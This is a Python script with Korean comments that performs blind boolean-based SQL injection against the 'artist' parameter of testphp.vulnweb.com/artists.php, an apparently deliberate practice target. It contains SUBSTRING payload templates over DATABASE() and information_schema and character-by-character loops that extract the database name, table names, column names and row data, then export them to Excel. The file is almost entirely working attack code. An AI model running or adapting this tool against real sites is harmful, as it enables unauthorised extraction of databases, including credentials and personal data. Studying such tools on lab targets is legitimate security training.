import requests
import pandas as pd
from openpyxl import Workbook, load_workbook
from openpyxl.styles import PatternFill, Font, Alignment
import os

# 설정 정보
url = "http://testphp.vulnweb.com/artists.php"  # 대상 URL
param_name = "artist"  # 공격할 파라미터 이름
true_response_indicator = "r4w8173"  # 참일 때 나타나는 응답 키워드

# SQL Injection 페이로드 템플릿 설정
payload_templates = {
    "database_name": "1 AND SUBSTRING(DATABASE(), {i}, 1) = '{char}' --",
    "table_name": "1 AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT {index},1), {i}, 1) = '{char}' --",
    "column_name": "1 AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' LIMIT {index},1), {i}, 1) = '{char}' --",
    "column_data": "1 AND SUBSTRING((SELECT {column_name} FROM {table_name} LIMIT {index},1), {i}, 1) = '{char}' --"
}

# 참/거짓 판별 함수
def is_true_response(response):
    return true_response_indicator in response.text

# 파일 중복 방지 이름 생성 함수
def generate_unique_filename(base_name="parameters", extension=".xlsx"):
    counter = 1
    filename = f"{base_name}{extension}"
    while os.path.exists(filename):
        filename = f"{base_name}{counter}{extension}"
        counter += 1
    return filename

# 엑셀 파일 저장 함수 (표 형식, 상단 회색 셀, 열 너비 조정)
def save_to_excel(data, base_filename):
    filename = generate_unique_filename(base_name=base_filename)
    df = pd.DataFrame(data)
    
    with pd.ExcelWriter(filename, engine="openpyxl") as writer:
        df.to_excel(writer, index=False, sheet_name="Sheet1")
        workbook = writer.book
        sheet = workbook.active

        # 상단 행 스타일 설정
        header_fill = PatternFill(start_color="CCCCCC", end_color="CCCCCC", fill_type="solid")
        header_font = Font(bold=True)
        for cell in sheet[1]:
            cell.fill = header_fill
            cell.font = header_font
            cell.alignment = Alignment(horizontal="center", vertical="center")

        # 열 너비 조정
        for column_cells in sheet.columns:
            max_length = max(len(str(cell.value)) for cell in column_cells)
            sheet.column_dimensions[column_cells[0].column_letter].width = max_length + 2

    print(f"[완료] 데이터가 '{filename}' 파일로 저장되었습니다.")

# 데이터 저장 여부 확인 함수
def ask_to_save(data, base_filename="parameters"):
    save_choice = input("데이터를 엑셀 파일로 저장하시겠습니까? (Y/N): ").strip().upper()
    if save_choice == "Y":
        save_to_excel(data, base_filename)
    else:
        print("데이터 저장이 취소되었습니다.")

# 데이터베이스 이름 추출 함수
def get_database_name():
    db_name = ""
    print("[정보] 데이터베이스 이름을 찾고 있습니다...")
    for i in range(1, 50):  # 최대 길이 50자 가정
        found_char = False
        for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_":
            payload = payload_templates["database_name"].format(i=i, char=char)
            params = {param_name: payload}
            response = requests.get(url, params=params)

            if is_true_response(response):
                db_name += char
                print(f"[+] 위치 {i}에서 '{char}' 문자 발견!")
                found_char = True
                break
        if not found_char:
            break
    print(f"[완료] 데이터베이스 이름: {db_name}")
    return db_name

# 테이블 이름 추출 함수
def get_table_names(limit=0):
    tables = []
    print("[정보] 데이터베이스의 테이블 이름을 찾고 있습니다...")
    for index in range(0, limit or 100):  # 최대 100개 테이블 또는 사용자 지정 개수
        table_name = ""
        for i in range(1, 50):  # 최대 테이블 이름 길이 50자 가정
            found_char = False
            for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_":
                payload = payload_templates["table_name"].format(index=index, i=i, char=char)
                params = {param_name: payload}
                response = requests.get(url, params=params)

                if is_true_response(response):
                    table_name += char
                    found_char = True
                    print(f"[+] 위치 {i}에서 '{char}' 문자 발견!")
                    break
            if not found_char:
                break
        if table_name:
            tables.append(table_name)
            print(f"[테이블 발견] {index + 1}번째 테이블 이름: {table_name}")
        else:
            break
    print(f"[완료] 총 {len(tables)}개의 테이블 이름 추출:\n" + "\n".join(tables))
    return tables

# 컬럼 이름 추출 함수
def get_column_names(table_name, limit=0):
    columns = []
    print(f"[정보] '{table_name}' 테이블의 컬럼명을 찾고 있습니다...")
    for index in range(0, limit or 100):  # 최대 100개 컬럼 또는 사용자 지정 개수
        column_name = ""
        for i in range(1, 50):  # 최대 컬럼 이름 길이 50자 가정
            found_char = False
            for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_":
                payload = payload_templates["column_name"].format(table_name=table_name, index=index, i=i, char=char)
                params = {param_name: payload}
                response = requests.get(url, params=params)

                if is_true_response(response):
                    column_name += char
                    found_char = True
                    print(f"[+] 위치 {i}에서 '{char}' 문자 발견!")
                    break
            if not found_char:
                break
        if column_name:
            columns.append(column_name)
            print(f"[컬럼 발견] {index + 1}번째 컬럼 이름: {column_name}")
        else:
            break
    print(f"[완료] 총 {len(columns)}개의 컬럼 이름 추출:\n" + "\n".join(columns))
    return columns

# 특정 테이블 컬럼의 데이터 추출 함수
def get_column_data(table_name, column_name, limit=0):
    data = []
    print(f"[정보] '{table_name}' 테이블의 '{column_name}' 컬럼 데이터를 찾고 있습니다...")

    for index in range(0, limit or 100):  # 최대 100개 데이터 행 또는 사용자 지정 개수
        row_data = ""
        for i in range(1, 50):  # 데이터 길이 최대 50자 가정
            found_char = False
            for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_":
                payload = payload_templates["column_data"].format(table_name=table_name, column_name=column_name, index=index, i=i, char=char)
                params = {param_name: payload}
                response = requests.get(url, params=params)

                if is_true_response(response):
                    row_data += char
                    found_char = True
                    print(f"[+] 위치 {i}에서 '{char}' 문자 발견!")
                    break
            if not found_char:
                break
        if row_data:
            data.append(row_data)
            print(f"[데이터 발견] {index + 1}번째 행 데이터: {row_data}")
        else:
            break
    print(f"[완료] 총 {len(data)}개의 데이터 추출:\n" + "\n".join(data))
    return data

# 모든 컬럼 데이터 추출 함수
def get_all_column_data(table_name, limit=0):
    columns = get_column_names(table_name)  # 해당 테이블의 모든 컬럼명을 추출
    all_data = {}

    for column in columns:
        print(f"\n[정보] '{table_name}' 테이블의 '{column}' 컬럼 데이터를 찾고 있습니다...")
        column_data = get_column_data(table_name, column, limit)
        all_data[column] = column_data
    return all_data

# 명령 선택 실행 함수
def main():
    while True:
        print("\n[옵션 선택]")
        print("1. 데이터베이스 추출")
        print("2. 테이블 추출")
        print("3. 컬럼 추출")
        print("4. 데이터 추출")
        print("5. 종료")
        choice = input("작업을 선택하세요: ")

        if choice == "1":
            db_name = get_database_name()
            ask_to_save({"Database Name": [db_name]}, "database_name")
        elif choice == "2":
            limit = int(input("추출할 테이블 개수를 입력하세요 (0 입력 시 전체 추출): "))
            tables = get_table_names(limit)
            ask_to_save({"Table Names": tables}, "tables")
        elif choice == "3":
            table_name = input("컬럼을 가져올 테이블 이름을 입력하세요: ")
            limit = int(input("추출할 컬럼 개수를 입력하세요 (0 입력 시 전체 추출): "))
            columns = get_column_names(table_name, limit)
            ask_to_save({"Column Names": columns}, f"{table_name}_columns")
        elif choice == "4":
            table_name = input("데이터를 가져올 테이블 이름을 입력하세요: ")
            column_name = input("데이터를 가져올 컬럼 이름을 입력하세요 (ALL 입력 시 모든 컬럼의 데이터 추출): ")
            limit = int(input("추출할 데이터 개수를 입력하세요 (0 입력 시 전체 추출): "))
            
            if column_name.upper() == "ALL":
                data = get_all_column_data(table_name, limit)
                ask_to_save(data, f"{table_name}_all_columns_data")
            else:
                data = get_column_data(table_name, column_name, limit)
                ask_to_save({column_name: data}, f"{table_name}_{column_name}_data")
        elif choice == "5":
            print("프로그램을 종료합니다.")
            break
        else:
            print("잘못된 선택입니다. 다시 입력하세요.")

# 프로그램 실행
if __name__ == "__main__":
    main()
